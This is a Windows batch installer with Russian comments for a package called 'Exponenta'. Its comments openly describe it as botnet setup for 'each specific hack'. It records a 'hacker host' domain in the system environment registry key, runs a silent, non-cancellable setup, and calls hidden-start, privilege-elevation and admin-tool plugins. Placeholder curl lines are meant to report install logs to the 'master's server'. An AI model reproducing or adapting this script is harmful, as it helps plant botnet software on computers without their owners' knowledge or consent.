@echo off
rem
rem Коммандный файл инсталляции дистрибутива с основными файлами пакета "Exponenta"
rem
rem USAGE
rem > InstallMainExponenta.bat <dest_dir> <hacker host server 1 domain>
rem Запускать файл с правами администратора

setlocal enableextensions enabledelayedexpansion

Rem Установка системнмных переменных окружения

set Key=HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment
set Chocolatey=%ALLUSERSPROFILE%\chocolatey

rem Подготовка пользовательских переменных окружения.
rem Эти переменные окружения редактируются пользователем  под каждый конкретный взлом.
rem Также проверяется наличие манифеста приложения или модуля. Если манифест присутствует -- ничегго не делается.
rem создаём системные переменные Windows для ботнета
set Dest_DIR=%1
set Hacker_host1=%2


echo -
echo Добро пожаловать в программу установки пакета
echo Данная программа устанавливает файлы в каталог %Dest_DIR%
echo -

rem Распаковка дистрибутива из SFX Архива в каталог %Dest_DIR%
rem Автоматическая распаковка должна быть настроена отдельно
rem Внимание! смотрите на назначение системных переменных!
rem Совет. При программировании держите как сводку этот заполненный файл

rem Регистрация переменных, если нужно

echo
echo Регистрируем новые переменные окружения...
echo
rem %SystemRoot%\System32\reg.exe Add "!Key_Var!" /v "!Параметр!" /t REG_SZ /d "!Параметр!" /f 2>&1 | %SystemRoot%\system32\find.exe >nul 2>nul /I "Ошибка" && goto UnSuccess
rem echo The variable is created

%SystemRoot%\System32\reg.exe Add "!Key!" /v Hacker_host1 /t REG_SZ /d "!Hacker_host1!" /f
%SystemRoot%\System32\reg.exe Add "!Key!" /v PUB1 /t REG_SZ /d "!Dest_DIR!" /f

rem Insatall MainExponenta Files...
cd /d %curdir%

if not exist %Dest_Dir%\Distrib\plugins\ExponentaMainFilesSetup.exe goto UnSuccess
%Dest_Dir%\Distrib\plugins\ExponentaMainFilesSetup.exe /VERYSILENT /NOCANCEL

rem Install Duck Plugin
if not exist %Dest_Dir%\Util\duck-Install.bat goto pass_Duck
call %Dest_DIR%\Util\duck-Install.bat
:pass_Duck

rem Install Hidden Start Plugin
if not exist %Dest_Dir%\Util\HiddenStartInstall.bat goto pass_HiddenStart
call %Dest_DIR%\Util\HiddenStartInstall.bat
:pass_HiddenStart

rem Install Elevation Plugin
if not exist %Dest_DIR%\Util\ElevationInstall.bat goto pass_Elevation
call %Dest_DIR%\Util\ElevationInstall.bat
:pass_Elevation

rem Install Elevation Plugin
if not exist %Dest_DIR%\Util\AdminTInstall.bat goto pass_AdminT
call %Dest_DIR%\Util\AdminTInstall.bat
:pass_AdminT

rem Install Chocolatey Packet
if not exist %Dest_DIR%\Util\InstallChocolateyPackets.bat goto pass_Chocolatey
call %Dest_DIR%\Util\InstallChocolateyPackets.bat
:pass_Chocolatey

rem Refresh Environment
if not exist %Chocolatey%\Bin\RefreshEnv.cmd goto pass_Refresh
call %Chocolatey%\Bin\RefreshEnv.cmd
:pass_Refresh

rem Правка файлов конфигурации модуля Exponenta
@echo on
rem "=== Changing Exponente Config ==="
rem

rem создание списка постоянных изменений для демонов
echo -
echo Installation is made with Success!
rem
rem Отправка лога установки на сервер хозяина
rem curl
goto sess_Finish

:already_Exist
echo Installation Warning!
echo This Packet has been already installed
echo The yuden.Exponenta configuration stay the same.
rem
rem Отправка лога установки на сервер хозяина
rem curl
goto sess_Finish


:UnSuccess
echo General Error
echo Installation may be incomplete!
echo The yuden. Exponenta configuration stay the same.
rem
rem Отправка лога установки на сервер хозяина
rem curl
goto sess_Finish

:sess_Finish

echo "Delete unused files"
cd /d %curdir%

rd /S /Q WindowsPowerShell

rem pause
